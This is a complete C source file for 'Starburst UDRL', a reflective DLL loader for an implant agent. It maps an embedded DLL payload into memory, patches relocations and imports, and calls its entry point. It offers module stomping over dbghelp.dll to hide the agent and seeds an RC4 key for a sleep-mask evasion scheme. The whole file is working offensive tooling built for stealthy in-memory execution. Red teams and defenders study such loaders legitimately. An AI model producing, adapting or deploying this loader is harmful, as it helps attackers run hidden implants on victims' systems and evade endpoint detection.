#include <Common.h>
#include <Constexpr.h>
#include <UserData.h>

/*
 * Starburst UDRL - Reflective DLL Loader
 *
 * Loads the Starburst agent DLL from an embedded payload buffer into memory
 * via PE section mapping, relocation patching, and IAT resolution. Populates
 * a UDRL_USER_DATA struct for the sleep mask, then transfers execution to
 * DllMain.
 *
 * Compile-time configuration:
 *   LOAD_MODE        0 = VirtualAlloc (default), 1 = Module Stomp
 *   STOMP_DLL        Sacrificial DLL name for module stomping
 *   FREE_LOADER      1 = free initial loader allocation after load
 */

#ifndef LOAD_MODE
#define LOAD_MODE  0
#endif

#ifndef STOMP_DLL
#define STOMP_DLL  L"dbghelp.dll"
#endif

#ifndef FREE_LOADER
#define FREE_LOADER  1
#endif

#ifdef DEBUG
FUNC FILE *__cdecl __acrt_iob_funcs(unsigned index)
{
    STARDUST_INSTANCE
    return &(API( __iob_func )()[index]);
}

#define stdin  (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))
#endif

/* PE section characteristics to memory protection */
FUNC static DWORD SectionToProtect( DWORD ch ) {
    BOOL x = !!( ch & IMAGE_SCN_MEM_EXECUTE );
    BOOL r = !!( ch & IMAGE_SCN_MEM_READ    );
    BOOL w = !!( ch & IMAGE_SCN_MEM_WRITE   );

    if ( x && w && r ) return PAGE_EXECUTE_READWRITE;
    if ( x && r      ) return PAGE_EXECUTE_READ;
    if ( x && w      ) return PAGE_EXECUTE_WRITECOPY;
    if ( x           ) return PAGE_EXECUTE;
    if ( w && r      ) return PAGE_READWRITE;
    if ( r           ) return PAGE_READONLY;
    if ( w           ) return PAGE_WRITECOPY;
    return PAGE_NOACCESS;
}

/* Find .text section in a loaded module (for module stomping) */
FUNC static BOOL FindTextSection( PBYTE Base, PVOID *Addr, PDWORD Size ) {
    PIMAGE_DOS_HEADER Dos = C_PTR( Base );
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE ) return FALSE;

    PIMAGE_NT_HEADERS Nt = C_PTR( Base + Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE ) return FALSE;

    PIMAGE_SECTION_HEADER Sec = IMAGE_FIRST_SECTION( Nt );
    for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
        if ( ( Sec[i].Characteristics & IMAGE_SCN_CNT_CODE ) &&
             ( Sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
            *Addr = Base + Sec[i].VirtualAddress;
            *Size = Sec[i].Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* Generate pseudo-random RC4 key from RDTSC */
FUNC static VOID GenerateRc4Key( PBYTE Key ) {
    for ( int i = 0; i < 16; i += 4 ) {
        DWORD tick;
#ifdef _WIN64
        tick = (DWORD)__rdtsc();
#else
        tick = (DWORD)__rdtsc();
#endif
        Key[i]     = (BYTE)( tick );
        Key[i + 1] = (BYTE)( tick >> 8 );
        Key[i + 2] = (BYTE)( tick >> 16 );
        Key[i + 3] = (BYTE)( tick >> 24 );
        for ( volatile int j = 0; j < 100; j++ ) {}
    }
}

/* Resolve all DLLs and APIs using the X-macro pattern from DLL_LIST/API_LIST */
FUNC static BOOL ResolveApis()
{
    STARDUST_INSTANCE

    MOD( Ntdll )    = LdrModulePeb( H_MODULE_NTDLL );
    MOD( Kernel32 ) = LdrModulePeb( H_MODULE_KERNEL32 );

    RESOLVE( LoadLibraryA, Kernel32 );

    if ( !MOD( Ntdll ) || !MOD( Kernel32 ) || !API( LoadLibraryA ) )
        return FALSE;

    #define DLL_ENTRY(mod) if ( !( MOD( mod ) = API( LoadLibraryA )( #mod ) ) ) return FALSE;
    DLL_LIST
    #undef DLL_ENTRY

    #define API_ENTRY(api, mod) if ( !( RESOLVE( api, mod ) ) ) return FALSE;
    API_LIST
    #undef API_ENTRY

    return TRUE;
}

/*
 * Main - Reflective DLL Loader entry point.
 *
 * Param: pointer to the raw DLL payload buffer (set by the caller/stub).
 *        The first 4 bytes are the DLL size, followed by the raw PE bytes.
 *        If Param is NULL, the loader looks for the payload appended after
 *        its own image (StRipEnd).
 */
FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    /* ── Resolve APIs ── */

    if ( ! ResolveApis() )
        return;

#ifdef DEBUG
    if ( API( AllocConsole )() )
    {
        HWND cWindows = API( GetConsoleWindow )();
        API( freopen )("CONIN$", "r", stdin);
        API( freopen )("CONOUT$", "w", stderr);
        API( freopen )("CONOUT$", "w", stdout);
        API( ShowWindow )(cWindows, SW_RESTORE);
        API( SetForegroundWindow )(cWindows);
        API( UpdateWindow )(cWindows);
    }
#endif

    PRINT("Starburst UDRL starting...");

    /* ── Locate DLL payload ── */

    PBYTE DllRaw   = NULL;
    DWORD DllSize  = 0;

    if ( Param ) {
        /* Payload passed as argument (length-prefixed DLL follows loader) */
        DllSize = *(PDWORD) Param;
        DllRaw  = (PBYTE) Param + 4;
    } else {
        /* Payload appended after our image (standalone mode) */
        PBYTE End = (PBYTE) StRipEnd();
        DllSize = *(PDWORD) End;
        DllRaw  = End + 4;
    }

    if ( ! DllRaw || DllSize < sizeof(IMAGE_DOS_HEADER) )
        return;

    PRINT("Located DLL payload: raw=%p size=%lu", DllRaw, DllSize);

    /* ── Parse PE headers ── */

    PIMAGE_DOS_HEADER Dos = C_PTR( DllRaw );
    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE )
        return;

    PIMAGE_NT_HEADERS Nt = C_PTR( DllRaw + Dos->e_lfanew );
    if ( Nt->Signature != IMAGE_NT_SIGNATURE )
        return;

    DWORD     ImageSize     = Nt->OptionalHeader.SizeOfImage;
    DWORD     HeadersSize   = Nt->OptionalHeader.SizeOfHeaders;
    ULONGLONG PreferredBase = Nt->OptionalHeader.ImageBase;
    WORD      NumSections   = Nt->FileHeader.NumberOfSections;

    PIMAGE_SECTION_HEADER Sections = IMAGE_FIRST_SECTION( Nt );

    PRINT("PE parsed: ImageSize=%lu Sections=%u PreferredBase=%p", ImageSize, NumSections, (PVOID)PreferredBase);

    /* ── Allocate target memory ── */

    PBYTE    MappedBase     = NULL;
    HMODULE  StompedModule  = NULL;
    PVOID    StompedText    = NULL;
    DWORD    StompedTextSz  = 0;

#if LOAD_MODE == 1
    /* Module stomping: load a sacrificial DLL */
    StompedModule = API( LoadLibraryExW )(
        STOMP_DLL, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( ! StompedModule ) return;

    if ( ! FindTextSection( (PBYTE)StompedModule, &StompedText, &StompedTextSz ) )
        return;
    if ( StompedTextSz < ImageSize )
        return;

    MappedBase = (PBYTE) StompedModule;

    DWORD OldProt;
    API( VirtualProtect )( MappedBase, ImageSize, PAGE_READWRITE, &OldProt );
#else
    /* Standard VirtualAlloc */
    MappedBase = API( VirtualAlloc )(
        NULL, ImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( ! MappedBase ) return;
#endif

    PRINT("Allocated image base at %p", MappedBase);

    /* ── Map PE sections ── */

    MmCopy( MappedBase, DllRaw, HeadersSize );

    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].SizeOfRawData == 0 )
            continue;
        MmCopy(
            MappedBase + Sections[i].VirtualAddress,
            DllRaw     + Sections[i].PointerToRawData,
            Sections[i].SizeOfRawData
        );
    }

    /* Refresh header pointers to mapped copy */
    Dos = C_PTR( MappedBase );
    Nt  = C_PTR( MappedBase + Dos->e_lfanew );

    PRINT("Sections mapped to %p", MappedBase);

    /* ── Process relocations ── */

    LONGLONG Delta = (LONGLONG)( (ULONGLONG)MappedBase - PreferredBase );

    if ( Delta != 0 ) {
        DWORD RelocRva  = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].VirtualAddress;
        DWORD RelocSize = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ].Size;

        if ( RelocRva && RelocSize ) {
            PIMAGE_BASE_RELOCATION Reloc = C_PTR( MappedBase + RelocRva );
            PBYTE RelocEnd = (PBYTE)Reloc + RelocSize;

            while ( (PBYTE)Reloc < RelocEnd && Reloc->SizeOfBlock ) {
                DWORD Count = ( Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof(WORD);
                PWORD Entries = (PWORD)( (PBYTE)Reloc + sizeof(IMAGE_BASE_RELOCATION) );

                for ( DWORD i = 0; i < Count; i++ ) {
                    WORD Type   = Entries[i] >> 12;
                    WORD Offset = Entries[i] & 0xFFF;
                    PBYTE Patch = MappedBase + Reloc->VirtualAddress + Offset;

                    switch ( Type ) {
                        case IMAGE_REL_BASED_DIR64:
                            *(PULONGLONG)Patch += Delta;
                            break;
                        case IMAGE_REL_BASED_HIGHLOW:
                            *(PDWORD)Patch += (DWORD)Delta;
                            break;
                        case IMAGE_REL_BASED_HIGH:
                            *(PWORD)Patch += (WORD)( Delta >> 16 );
                            break;
                        case IMAGE_REL_BASED_LOW:
                            *(PWORD)Patch += (WORD)Delta;
                            break;
                        case IMAGE_REL_BASED_ABSOLUTE:
                            break;
                    }
                }
                Reloc = C_PTR( (PBYTE)Reloc + Reloc->SizeOfBlock );
            }
        }
    }

    PRINT("Relocations applied (delta=%lld)", Delta);

    /* ── Resolve imports ── */

    DWORD ImportRva = Nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ].VirtualAddress;

    if ( ImportRva ) {
        PIMAGE_IMPORT_DESCRIPTOR Imp = C_PTR( MappedBase + ImportRva );

        while ( Imp->Name ) {
            PCHAR ModName = C_PTR( MappedBase + Imp->Name );
            HMODULE hMod  = API( LoadLibraryA )( ModName );

            if ( ! hMod ) { Imp++; continue; }

            PIMAGE_THUNK_DATA OrigThunk = C_PTR(
                MappedBase + ( Imp->OriginalFirstThunk ? Imp->OriginalFirstThunk : Imp->FirstThunk ) );
            PIMAGE_THUNK_DATA IatThunk  = C_PTR( MappedBase + Imp->FirstThunk );

            while ( OrigThunk->u1.AddressOfData ) {
                FARPROC Func = NULL;

#ifdef _WIN64
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64 )
                    Func = API( GetProcAddress )( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#else
                if ( OrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 )
                    Func = API( GetProcAddress )( hMod, (LPCSTR)( OrigThunk->u1.Ordinal & 0xFFFF ) );
#endif
                else {
                    PIMAGE_IMPORT_BY_NAME ImpName = C_PTR( MappedBase + OrigThunk->u1.AddressOfData );
                    Func = API( GetProcAddress )( hMod, ImpName->Name );
                }

                IatThunk->u1.Function = (ULONGLONG)Func;
                OrigThunk++;
                IatThunk++;
            }
            Imp++;
        }
    }

    PRINT("Imports resolved");

    /* ── Set section protections ── */

    Sections = IMAGE_FIRST_SECTION( Nt );
    for ( WORD i = 0; i < NumSections; i++ ) {
        if ( Sections[i].Misc.VirtualSize == 0 )
            continue;
        DWORD Prot = SectionToProtect( Sections[i].Characteristics );
        DWORD Old;
        API( VirtualProtect )(
            MappedBase + Sections[i].VirtualAddress,
            Sections[i].Misc.VirtualSize,
            Prot, &Old );
    }

    { DWORD Old; API( VirtualProtect )( MappedBase, HeadersSize, PAGE_READONLY, &Old ); }

    PRINT("Section protections applied");

    /* ── Flush instruction cache ── */

    API( NtFlushInstructionCache )( (HANDLE)-1, MappedBase, ImageSize );

    /* ── Populate UDRL_USER_DATA ── */

    UDRL_USER_DATA *Ud = API( VirtualAlloc )(
        NULL, sizeof(UDRL_USER_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if ( Ud ) {
        MmZero( Ud, sizeof(UDRL_USER_DATA) );
        Ud->magic = UDRL_MAGIC;

#if LOAD_MODE == 1
        Ud->load_type         = LOAD_TYPE_MODULE_STOMP;
        Ud->stomped_module    = StompedModule;
        Ud->stomped_text_base = StompedText;
        Ud->stomped_text_size = StompedTextSz;
#else
        Ud->load_type = LOAD_TYPE_VIRTUAL_ALLOC;
#endif

        Ud->agent_base  = MappedBase;
        Ud->agent_size  = ImageSize;
        Ud->loader_base = Instance()->Base.Buffer;
        Ud->loader_size = Instance()->Base.Length;

        Ud->regions[0].base    = MappedBase;
        Ud->regions[0].size    = ImageSize;
        Ud->regions[0].protect = PAGE_EXECUTE_READ;
        Ud->region_count = 1;

        GenerateRc4Key( Ud->rc4_key );
    }

    PRINT("UDRL_USER_DATA at %p (magic=%llx)", Ud, Ud ? Ud->magic : 0);

    /* ── Call DllMain ── */

    typedef BOOL (WINAPI *fnDllMain)( HINSTANCE, DWORD, LPVOID );

    DWORD EntryRva = Nt->OptionalHeader.AddressOfEntryPoint;
    if ( EntryRva ) {
        fnDllMain pDllMain = C_PTR( MappedBase + EntryRva );
        PRINT("Calling DllMain at %p", pDllMain);
        pDllMain( (HINSTANCE)MappedBase, DLL_PROCESS_ATTACH, (LPVOID)Ud );
    }

#if FREE_LOADER
    /* The agent can free the initial loader allocation later using
     * Ud->loader_base / Ud->loader_size. We cannot VirtualFree here
     * because we are executing from within that allocation. */
#endif
}
